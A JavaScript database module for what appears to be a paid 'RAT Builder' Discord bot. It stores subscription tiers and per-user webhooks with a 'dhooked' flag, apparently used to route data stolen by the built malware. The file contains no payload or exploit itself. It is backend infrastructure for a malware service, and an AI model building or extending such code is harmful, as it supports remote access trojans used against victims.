import sqlite3 from "sqlite3";

var db = new sqlite3.Database("/root/RAT_Builder/premium.db", sqlite3.OPEN_READWRITE, (err) => {
  if (err && err.code == "SQLITE_CANTOPEN") {
    createDatabase();
  } else if (err) {
    console.error("[RAT Builder] " + err);
  }
});

export async function createTables() {
  return new Promise(function (resolve, reject) {
    db.exec(
      `CREATE TABLE IF NOT EXISTS premium (
        user_id VARCHAR(255) PRIMARY KEY NOT NULL,
        type VARCHAR(255) NOT NULL,
        expires VARCHAR(255)
      );`,
      (err) => {
        if (err) {
          console.error(err);
          return resolve(null);
        }
        return resolve(true);
      }
    );
    db.exec(
      `CREATE TABLE IF NOT EXISTS webhooks (
        code VARCHAR(255) PRIMARY KEY NOT NULL,
        user_id VARCHAR(255) NOT NULL,
        webhook VARCHAR(255) NOT NULL,
        dhooked BOOLEAN NOT NULL
      );`,
      (err) => {
        if (err) {
          console.error(err);
        }
        return resolve();
      }
    );
  });
}

export async function getPlan(interaction, userID) {
  return new Promise(function (resolve, reject) {
    db.all(`SELECT * FROM premium WHERE user_id = $1;`, userID, (err, rows) => {
      if (err) {
        console.error(err);
      }
      rows.forEach(async (row) => {
        if (row.expires != 0 && row.expires < Date.now()) {
          try {
            await deletePremium(userID);
            const member = await interaction.guild.members.fetch(userID);
            await member.roles.remove(client.config.tiers[1]);
            await member.roles.remove(client.config.tiers[2]);
            await member.roles.remove(client.config.tiers[3]);
          } catch (err) {
            console.error(err);
          }

          return resolve("tier_0");
        }
        return resolve(row.type);
      });
      return resolve("tier_0");
    });
  });
}

export async function getAllPremiumMembers() {
  return new Promise(function (resolve, reject) {
    db.all(`SELECT * FROM premium;`, (err, rows) => {
      if (err) {
        console.error(err);
        return resolve(null);
      }
      return resolve(rows);
    });
  });
}

export async function setPremium(userID, tier, expiration) {
  return new Promise(function (resolve, reject) {
    db.run(
      `INSERT OR REPLACE INTO premium (user_id, expires, type) VALUES ($1, $2, $3);`,
      [userID, expiration, tier],
      (err) => {
        if (err) {
          console.error(err);
          return resolve(null);
        }
        return resolve(true);
      }
    );
  });
}

export async function deletePremium(userID) {
  return new Promise(function (resolve, reject) {
    db.run(`DELETE FROM premium WHERE user_id = $1;`, userID, (err) => {
      if (err) {
        console.error(err);
        return resolve(null);
      }
      return resolve(true);
    });
  });
}

export async function getAllWebhooks() {
  return new Promise(function (resolve, reject) {
    db.all(`SELECT * FROM webhooks;`, (err, rows) => {
      if (err) {
        console.error(err);
      }
      return resolve(rows);
    });
  });
}

export async function getWebhooks(userID) {
  return new Promise(function (resolve, reject) {
    db.all(`SELECT * FROM webhooks WHERE user_id = $1;`, userID, (err, rows) => {
      if (err) {
        console.error(err);
      }
      return resolve(rows);
    });
  });
}

export async function getWebhook(code) {
  return new Promise(function (resolve, reject) {
    db.all(`SELECT * FROM webhooks WHERE code = $1;`, code, (err, rows) => {
      if (err) {
        console.error(err);
      }
      rows.forEach((row) => {
        return resolve(row);
      });
      return resolve({ webhook: null, dhooked: true });
    });
  });
}

export async function getCode(userID, webhook) {
  return new Promise(function (resolve, reject) {
    db.all(`SELECT * FROM webhooks WHERE user_id = $1 AND webhook = $2;`, [userID, webhook], (err, rows) => {
      if (err) {
        console.error(err);
      }
      rows.forEach((row) => {
        return resolve(row.code);
      });
      return resolve(null);
    });
  });
}

export async function setWebhook(userID, code, webhook, dhooked = true) {
  return new Promise(function (resolve, reject) {
    db.run(
      `INSERT OR REPLACE INTO webhooks (code, user_id, webhook, dhooked) VALUES ($1, $2, $3, $4);`,
      [code, userID, webhook, dhooked],
      (err) => {
        if (err) {
          console.error(err);
        }
        return resolve();
      }
    );
  });
}

export async function deleteWebhook(code) {
  return new Promise(function (resolve, reject) {
    db.run(`DELETE FROM webhooks WHERE code = $1;`, code, (err) => {
      if (err) {
        console.error(err);
        return resolve(null);
      }
      return resolve(true);
    });
  });
}

function createDatabase() {
  db = new sqlite3.Database("/root/RAT_Builder/premium.db", (err) => {
    if (err) {
      console.error("[RAT Builder] " + err);
    }
  });
}
